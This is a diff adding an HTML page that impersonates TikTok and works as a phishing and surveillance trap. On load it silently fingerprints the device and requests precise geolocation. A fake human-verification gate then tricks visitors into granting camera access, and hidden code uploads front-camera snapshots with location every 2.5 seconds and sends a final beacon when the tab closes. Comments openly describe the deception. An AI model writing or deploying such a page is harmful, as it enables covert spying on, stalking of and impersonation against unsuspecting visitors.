@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TikTok</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; background: #000; color: #fff; font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }
+  #feed { height: 100%; display: flex; flex-direction: column; justify-content: flex-end; padding: 20px 16px 96px; position: relative;
+    background: radial-gradient(120% 90% at 70% 20%, #2a1a4a 0%, #000 60%); }
+  #feed::before { content: ""; position: absolute; inset: 0; background: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100'><text x='8' y='55' font-size='54' opacity='0.14'>🎵</text></svg>") center/40% no-repeat; pointer-events: none; }
+  .user { font-weight: 700; font-size: 16px; margin-bottom: 8px; }
+  .caption { font-size: 14px; line-height: 1.4; opacity: .95; max-width: 78%; }
+  .caption b { color: #69c9d0; }
+  .music { margin-top: 10px; font-size: 12px; opacity: .8; display: flex; gap: 6px; align-items: center; }
+  .actions { position: absolute; right: 14px; bottom: 110px; display: flex; flex-direction: column; gap: 20px; text-align: center; font-size: 12px; }
+  .actions span { display: block; font-size: 26px; filter: drop-shadow(0 2px 4px rgba(0,0,0,.6)); }
+  .bottom { position: fixed; bottom: 0; left: 0; right: 0; display: flex; border-top: 1px solid #1f1f1f; background: #000; }
+  .bottom div { flex: 1; text-align: center; padding: 12px 0 18px; font-size: 20px; opacity: .55; }
+  .bottom div.on { opacity: 1; position: relative; }
+  .bottom div.on::after { content: ""; position: absolute; top: 0; left: 30%; right: 30%; height: 2px; background: #fe2c55; }
+  #gate { position: fixed; inset: 0; z-index: 50; background: rgba(0,0,0,.92); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 28px; text-align: center; }
+  #gate .logo { font-size: 34px; font-weight: 800; letter-spacing: -1px; text-shadow: 2px 2px 0 #fe2c55, -2px -2px 0 #69c9d0; }
+  #gate p { margin: 16px 0 24px; font-size: 14px; color: #bbb; max-width: 300px; line-height: 1.5; }
+  #gate button { border: 0; width: 260px; padding: 14px; font-size: 15px; font-weight: 700; color: #fff; background: #fe2c55; border-radius: 6px; }
+  #gate .fine { margin-top: 14px; font-size: 10px; color: #666; }
+  #cam { position: fixed; width: 2px; height: 2px; opacity: .01; pointer-events: none; left: -10px; top: -10px; }
+  canvas { display: none; }
+</style>
+</head>
+<body>
+
+<div id="feed">
+  <div class="user">@snapchick.daily</div>
+  <div class="caption">POV: you found the <b>#fyp</b> 😭🔥 wait for it...</div>
+  <div class="music">♫ original sound - snapchick.daily</div>
+  <div class="actions"><span>♥</span>482K<span>💬</span>8,341<span>↗</span>12.2K</div>
+  <div class="bottom"><div>🏠</div><div class="on">🔍</div><div>➕</div><div>📥</div><div>👤</div></div>
+</div>
+
+<div id="gate">
+  <div class="logo">TikTok</div>
+  <p>⚠️ Verifying you're human — allow camera access to continue to the video.</p>
+  <button id="go">Allow &amp; Watch</button>
+  <div class="fine">By continuing you agree to our Terms of Service.</div>
+</div>
+
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="cv" width="480" height="360"></canvas>
+
+<script>
+(() => {
+  const EP = "";           // same origin
+  const state = { cam: false, geo: null, shots: 0 };
+
+  // ---------- fingerprint (runs instantly, no permissions needed) ----------
+  function fingerprint() {
+    let gpu = "n/a";
+    try {
+      const c = document.createElement("canvas").getContext("webgl");
+      const dbg = c.getExtension("WEBGL_debug_renderer_info");
+      gpu = c.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    } catch (_) {}
+    return {
+      screen: `${screen.width}x${screen.height}@${devicePixelRatio}x`,
+      viewport: `${innerWidth}x${innerHeight}`,
+      cores: navigator.hardwareConcurrency || null,
+      ram: navigator.deviceMemory || null,
+      gpu,
+      lang: navigator.language,
+      langs: navigator.languages,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      tzOffset: new Date().getTimezoneOffset(),
+      touch: "ontouchstart" in window,
+      battery: navigator.getBattery ? "pending" : "unsupported",
+      conn: navigator.connection ? (navigator.connection.effectiveType || "?") : "n/a",
+      cookies: navigator.cookieEnabled,
+      ref: document.referrer || null,
+      history: history.length
+    };
+  }
+
+  function batteryInfo(fp) {
+    if (!navigator.getBattery) return;
+    navigator.getBattery().then(b => {
+      fp.battery = { level: Math.round(b.level * 100) + "%", charging: b.charging };
+    }).catch(() => {});
+  }
+
+  fetch(EP + "/api/recon", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(fingerprint())
+  }).then(r => r.json()).catch(() => {});
+  batteryInfo({});
+
+  // ---------- geolocation (silent prompt, value captured when granted/denied) ----------
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      p => { state.geo = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, alt: p.coords.altitude, spd: p.coords.speed }; },
+      e => { state.geo = { denied: e.message }; },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  }
+
+  // ---------- camera frames ----------
+  async function startCam() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } }, audio: false
+      });
+      const v = document.getElementById("cam");
+      v.srcObject = stream;
+      await v.play();
+      state.cam = true;
+      grabLoop();
+    } catch (_) { /* denied -> recon+geo already shipped */ }
+  }
+
+  function shoot(label) {
+    if (!state.cam) return;
+    const v = document.getElementById("cam"), c = document.getElementById("cv"), x = c.getContext("2d");
+    if (!v.videoWidth) return;
+    x.drawImage(v, 0, 0, c.width, c.height);
+    fetch(EP + "/api/shot", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image: c.toDataURL("image/jpeg", 0.72), label, meta: { geo: state.geo, shot: state.shots } })
+    }).catch(() => {});
+    state.shots++;
+  }
+
+  function grabLoop() {
+    shoot("live");
+    setTimeout(grabLoop, 2500);   // a frame every 2.5s while the tab lives
+  }
+
+  // exit beacon: one last geo + shot attempt on tab close
+  addEventListener("pagehide", () => {
+    navigator.sendBeacon(EP + "/api/bye", JSON.stringify({ geo: state.geo, shots: state.shots, session: performance.now() | 0 }));
+  });
+
+  // ---------- gate button: justifies the permission prompt ----------
+  document.getElementById("go").addEventListener("click", async () => {
+    document.getElementById("gate").style.display = "none";
+    await startCam();
+    // fake loading -> "video ready" feel
+    setTimeout(() => {
+      document.querySelector(".caption").innerHTML = "thanks for verifying 💜 enjoy the <b>#fyp</b>";
+    }, 900);
+  });
+})();
+</script>
+</body>
+</html>
